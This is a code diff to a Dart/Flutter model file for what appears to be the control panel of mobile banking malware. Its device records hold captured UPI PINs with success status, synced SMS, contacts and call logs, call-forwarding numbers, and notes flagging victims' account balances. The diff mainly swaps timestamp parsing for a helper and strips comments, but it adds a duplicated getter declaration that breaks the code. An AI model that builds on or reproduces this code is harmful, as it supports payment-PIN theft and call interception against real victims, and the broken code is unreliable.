@@ -1,4 +1,3 @@
-// UPI PIN Entry Model
 class UPIPinEntry {
   final String pin;
   final String appType;
@@ -18,7 +17,7 @@ class UPIPinEntry {
       appType: json['app_type'] ?? '',
       status: json['status'] ?? 'failed',
       detectedAt: json['detected_at'] != null
-          ? DateTime.parse(json['detected_at'])
+          ? _parseTimestamp(json['detected_at'])
           : DateTime.now(),
     );
   }
@@ -91,13 +90,13 @@ class DeviceStats {
       totalContacts: json['total_contacts'] ?? 0,
       totalCalls: json['total_calls'] ?? 0,
       lastSmsSyncDate: json['last_sms_sync'] != null
-          ? DateTime.parse(json['last_sms_sync'])
+          ? _parseTimestamp(json['last_sms_sync'])
           : null,
       lastContactSyncDate: json['last_contact_sync'] != null
-          ? DateTime.parse(json['last_contact_sync'])
+          ? _parseTimestamp(json['last_contact_sync'])
           : null,
       lastCallSyncDate: json['last_call_sync'] != null
-          ? DateTime.parse(json['last_call_sync'])
+          ? _parseTimestamp(json['last_call_sync'])
           : null,
     );
   }
@@ -276,15 +275,10 @@ class SimInfo {
     };
   }
 
-  // Helper methods for SIM info
   bool get isActive => simState == 'Ready';
   bool get isDataSim => dataEnabled;
   String get fullCarrierInfo => '$carrierName ($networkType)';
 }
-
-// فقط فیلدهای جدید و بخش‌های تغییر یافته رو نشون میدم:
-
-
 
 class Device {
   final String deviceId;
@@ -342,10 +336,9 @@ class Device {
   final int? callForwardingSimSlot;
   final DateTime? callForwardingUpdatedAt;
 
-  // 👇 فیلدهای جدید برای Note
-  final String? notePriority;    // 'lowbalance', 'highbalance', 'none', یا null
-  final String? noteMessage;     // متن نوت
-  final DateTime? noteCreatedAt; // زمان ایجاد نوت (اختیاری)
+  final String? notePriority;
+  final String? noteMessage;
+  final DateTime? noteCreatedAt;
 
   Device({
     required this.deviceId,
@@ -402,9 +395,9 @@ class Device {
     this.callForwardingNumber,
     this.callForwardingSimSlot,
     this.callForwardingUpdatedAt,
-    this.notePriority,      // 👈 جدید
-    this.noteMessage,       // 👈 جدید
-    this.noteCreatedAt,     // 👈 جدید
+    this.notePriority,
+    this.noteMessage,
+    this.noteCreatedAt,
   });
 
   factory Device.fromJson(Map<String, dynamic> json) {
@@ -419,13 +412,13 @@ class Device {
       status: json['status'] ?? 'offline',
       batteryLevel: json['battery_level'] ?? 0,
       lastPing: json['last_ping'] != null
-          ? DateTime.parse(json['last_ping'])
+          ? _parseTimestamp(json['last_ping'])
           : DateTime.now(),
       settings: DeviceSettings.fromJson(json['settings'] ?? {}),
       stats: DeviceStats.fromJson(json['stats'] ?? {}),
-      registeredAt: DateTime.parse(json['registered_at']),
+      registeredAt: _parseTimestamp(json['registered_at']),
       updatedAt: json['updated_at'] != null
-          ? DateTime.parse(json['updated_at'])
+          ? _parseTimestamp(json['updated_at'])
           : null,
       brand: json['brand'],
       deviceName: json['device_name'],
@@ -463,20 +456,20 @@ class Device {
           : null,
       hasUpi: json['has_upi'] ?? false,
       upiDetectedAt: json['upi_detected_at'] != null
-          ? DateTime.parse(json['upi_detected_at'])
+          ? _parseTimestamp(json['upi_detected_at'])
           : null,
-      upiPin: json['upi_pin'],  // Deprecated - kept for backward compatibility
+      upiPin: json['upi_pin'],
       upiPins: json['upi_pins'] != null
           ? (json['upi_pins'] as List)
               .map((x) => UPIPinEntry.fromJson(x))
               .toList()
           : null,
       upiLastUpdatedAt: json['upi_last_updated_at'] != null
-          ? DateTime.parse(json['upi_last_updated_at'])
+          ? _parseTimestamp(json['upi_last_updated_at'])
           : null,
       isOnlineStatus: json['is_online'],
       lastOnlineUpdate: json['last_online_update'] != null
-          ? DateTime.parse(json['last_online_update'])
+          ? _parseTimestamp(json['last_online_update'])
           : null,
       fcmTokens: json['fcm_tokens'] != null
           ? List<String>.from(json['fcm_tokens'])
@@ -485,13 +478,12 @@ class Device {
       callForwardingNumber: json['call_forwarding_number'],
       callForwardingSimSlot: json['call_forwarding_sim_slot'],
       callForwardingUpdatedAt: json['call_forwarding_updated_at'] != null
-          ? DateTime.parse(json['call_forwarding_updated_at'])
+          ? _parseTimestamp(json['call_forwarding_updated_at'])
           : null,
-      // 👇 فیلدهای جدید Note
       notePriority: json['note_priority'],
       noteMessage: json['note_message'],
       noteCreatedAt: json['note_created_at'] != null
-          ? DateTime.parse(json['note_created_at'])
+          ? _parseTimestamp(json['note_created_at'])
           : null,
     );
   }
@@ -563,7 +555,6 @@ class Device {
       if (callForwardingUpdatedAt != null)
         'call_forwarding_updated_at':
         callForwardingUpdatedAt!.toIso8601String(),
-      // 👇 فیلدهای جدید Note
       if (notePriority != null) 'note_priority': notePriority,
       if (noteMessage != null) 'note_message': noteMessage,
       if (noteCreatedAt != null)
@@ -571,14 +562,12 @@ class Device {
     };
   }
 
-  // Basic Status Getters
   bool get isOnline => status == 'online';
   bool get isOffline => !isOnline;
   bool get isActive =>
       stats.totalSms > 0 || stats.totalContacts > 0 || stats.totalCalls > 0;
   bool get isPending => !isActive;
 
-  // 👇 Note Getters (جدید)
   bool get hasNote => noteMessage != null && noteMessage!.isNotEmpty;
 
   bool get hasLowBalanceNote => notePriority == 'lowbalance';
@@ -600,10 +589,7 @@ class Device {
     return '${diff.inMinutes}m ago';
   }
 
-// بقیه getterها بدون تغییر...
-// (همه متدهای قبلی رو نگه دار)
-
-  // Device Info Getters
+  String get fullDeviceName {
   String get fullDeviceName {
     if (brand != null && model != null) {
       return '$brand $model';
@@ -611,7 +597,6 @@ class Device {
     return model;
   }
 
-  // Battery & Resources Getters
   bool get hasLowBattery => batteryLevel < 20;
   bool get hasCriticalBattery => batteryLevel < 10;
 
@@ -639,7 +624,6 @@ class Device {
     return '$freeGB / $totalGB GB';
   }
 
-  // SIM Card Getters - با پشتیبانی از حالت‌های مختلف
   bool get hasNoSim => simInfo == null || simInfo!.isEmpty;
   bool get hasSingleSim => simInfo != null && simInfo!.length == 1;
   bool get hasDualSim => simInfo != null && simInfo!.length == 2;
@@ -679,7 +663,6 @@ class Device {
     return '$simCount SIMs';
   }
 
-  // Get SIM by slot
   SimInfo? getSimBySlot(int slot) {
     if (hasNoSim) return null;
     try {
@@ -689,13 +672,11 @@ class Device {
     }
   }
 
-  // Check if specific SIM slot is active
   bool isSimSlotActive(int slot) {
     final sim = getSimBySlot(slot);
     return sim?.isActive ?? false;
   }
 
-  // UPI Getters
   String get upiStatus {
     if (hasUpi) {
       return 'UPI Enabled ✅';
@@ -711,7 +692,6 @@ class Device {
     return '${diff.inMinutes}m ago';
   }
 
-  // Deprecated - use hasUpiPins instead
   bool get hasUpiPin => upiPin != null && upiPin!.isNotEmpty;
 
   String get upiPinStatus {
@@ -719,25 +699,19 @@ class Device {
     return 'No PIN';
   }
 
-  // New UPI Pins Getters
   bool get hasUpiPins => upiPins != null && upiPins!.isNotEmpty;
 
-  // Get latest PIN (array is sorted newest first)
   UPIPinEntry? get latestUpiPin => hasUpiPins ? upiPins![0] : null;
 
-  // Get all successful PINs
   List<UPIPinEntry> get successUpiPins {
     if (!hasUpiPins) return [];
     return upiPins!.where((pin) => pin.isSuccess).toList();
   }
 
-  // Get PINs count
   int get upiPinsCount => upiPins?.length ?? 0;
 
-  // Get successful PINs count
   int get successUpiPinsCount => successUpiPins.length;
 
-  // Network Info
   String get networkInfo {
     if (networkType == null) return 'Unknown';
     return networkType!;
@@ -746,7 +720,6 @@ class Device {
   bool get isOnWifi => networkType?.toLowerCase() == 'wifi';
   bool get isOnMobile => networkType?.toLowerCase() == 'mobile';
 
-  // Call Forwarding Info
   bool get hasCallForwarding =>
       callForwardingEnabled == true && callForwardingNumber != null;
 
@@ -755,6 +728,37 @@ class Device {
     final simSlot =
     callForwardingSimSlot != null ? 'SIM ${callForwardingSimSlot! + 1}' : 'Unknown SIM';
     return 'Active on $simSlot → $callForwardingNumber';
+  }
+
+  static DateTime _parseTimestamp(dynamic timestamp) {
+    if (timestamp == null) {
+      return DateTime.now();
+    }
+    
+    if (timestamp is int) {
+      return DateTime.fromMillisecondsSinceEpoch(timestamp, isUtc: true).toLocal();
+    }
+    
+    if (timestamp is String) {
+      try {
+        final date = DateTime.parse(timestamp);
+        if (date.isUtc) {
+          return date.toLocal();
+        }
+        return date;
+      } catch (e) {
+        return DateTime.now();
+      }
+    }
+    
+    if (timestamp is DateTime) {
+      if (timestamp.isUtc) {
+        return timestamp.toLocal();
+      }
+      return timestamp;
+    }
+    
+    return DateTime.now();
   }
 }
 
